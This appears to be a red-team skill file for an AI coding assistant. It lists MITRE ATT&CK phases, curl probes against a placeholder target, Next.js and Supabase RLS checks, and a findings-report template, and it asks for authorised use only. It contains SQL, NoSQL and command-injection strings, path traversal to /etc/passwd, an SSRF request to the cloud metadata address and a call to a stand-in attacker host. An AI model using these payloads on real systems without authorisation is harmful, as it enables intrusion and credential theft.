# Red Team Tactics

**Trigger:** red team, offensive security, attack simulation, MITRE ATT&CK, penetration testing

---

## Purpose

Red team tactics based on MITRE ATT&CK framework. For authorized security testing, penetration testing engagements, and security research.

**IMPORTANT:** Only use in authorized contexts with explicit permission.

---

## Attack Phases (MITRE ATT&CK)

### 1. Reconnaissance
```
- Enumerate public endpoints
- Identify technology stack (headers, errors)
- Find exposed documentation
- Check for information disclosure
- Map attack surface
```

### 2. Initial Access
```
- Test authentication bypasses
- Check for default credentials
- Test for injection vulnerabilities
- Check OAuth/OIDC misconfigurations
- Test API key exposure
```

### 3. Execution
```
- Test command injection
- Check for SSTI (Server-Side Template Injection)
- Test file upload vulnerabilities
- Check for deserialization issues
```

### 4. Privilege Escalation
```
- Test IDOR (Insecure Direct Object Reference)
- Check for role manipulation
- Test JWT tampering
- Check for mass assignment
- Test admin functionality access
```

### 5. Defense Evasion
```
- Test rate limiting bypasses
- Check WAF bypass techniques
- Test input validation bypasses
- Check for filter evasions
```

### 6. Lateral Movement
```
- Test SSRF (Server-Side Request Forgery)
- Check internal service access
- Test database access patterns
- Check for shared credentials
```

---

## Web Application Testing

### Authentication Tests
```bash
# Test for auth bypass
curl -X GET https://target.com/api/admin/users
curl -X GET https://target.com/api/admin/users -H "X-Forwarded-For: 127.0.0.1"

# Test password reset
curl -X POST https://target.com/api/auth/reset \
  -d '{"email": "victim@example.com", "newPassword": "hacked"}'

# Test session handling
curl -X GET https://target.com/api/me -H "Cookie: session=<old_session>"
```

### Authorization Tests
```bash
# IDOR test
curl -X GET https://target.com/api/users/1/profile  # Your user
curl -X GET https://target.com/api/users/2/profile  # Other user

# Role bypass
curl -X POST https://target.com/api/admin/action \
  -H "Authorization: Bearer <user_token>"

# Parameter tampering
curl -X PUT https://target.com/api/users/1 \
  -d '{"role": "admin"}'
```

### Injection Tests
```bash
# SQL injection
curl -X GET "https://target.com/api/users?id=1' OR '1'='1"

# NoSQL injection
curl -X POST https://target.com/api/login \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# Command injection
curl -X POST https://target.com/api/export \
  -d '{"filename": "test; cat /etc/passwd"}'
```

### SSRF Tests
```bash
# Internal service access
curl -X POST https://target.com/api/fetch \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'

# DNS rebinding
curl -X POST https://target.com/api/fetch \
  -d '{"url": "http://attacker-controlled.com"}'
```

---

## Next.js Specific

### Server Actions
```typescript
// Test for missing auth
// Call Server Action directly without session

// Test for IDOR
await updateProfile({ userId: "other-users-id", data: {...} })

// Test for mass assignment
await createUser({ role: "admin", ...regularUserData })
```

### API Routes
```typescript
// Route Handlers need CSRF protection (unlike Server Actions)
// Test: Can we call mutating endpoints without CSRF token?

// Check for path traversal in dynamic routes
GET /api/files/../../../etc/passwd
```

### Middleware Bypass
```
# Test for middleware bypass via path manipulation
/api/admin → blocked
/api/admin/ → might bypass
/API/admin → might bypass
/api/admin?bypass → might bypass
```

---

## Supabase/RLS Testing

### RLS Bypass
```sql
-- Test if RLS is enabled
SELECT * FROM users;  -- Should fail without proper auth

-- Test policy logic
-- As user A, try to access user B's data
SELECT * FROM orders WHERE user_id = 'user-b-id';

-- Test for policy gaps
INSERT INTO orders (user_id, total) VALUES ('other-user', 100);
```

### Auth Token Testing
```javascript
// Tamper with JWT
const token = supabase.auth.session()?.access_token
const [header, payload, sig] = token.split('.')
// Modify payload and test with new token

// Test for token reuse after logout
// Logout, then use old token
```

---

## Reporting Format

```markdown
## Security Finding: [Title]

### Severity
Critical / High / Medium / Low / Informational

### CVSS Score
[X.X] (if applicable)

### Description
[What is the vulnerability]

### Impact
[What can an attacker do]

### Reproduction Steps
1. [Step 1]
2. [Step 2]
3. [Step 3]

### Proof of Concept
```
[Code/commands to reproduce]
```

### Affected Components
- [Component 1]
- [Component 2]

### Remediation
[How to fix]

### References
- [OWASP link]
- [CVE if applicable]
```

---

## Ethics Reminder

1. **Authorization Required** — Only test systems you have permission to test
2. **Scope Boundaries** — Stay within agreed scope
3. **Data Handling** — Don't exfiltrate real user data
4. **Responsible Disclosure** — Report findings properly
5. **Documentation** — Keep records of all testing activities
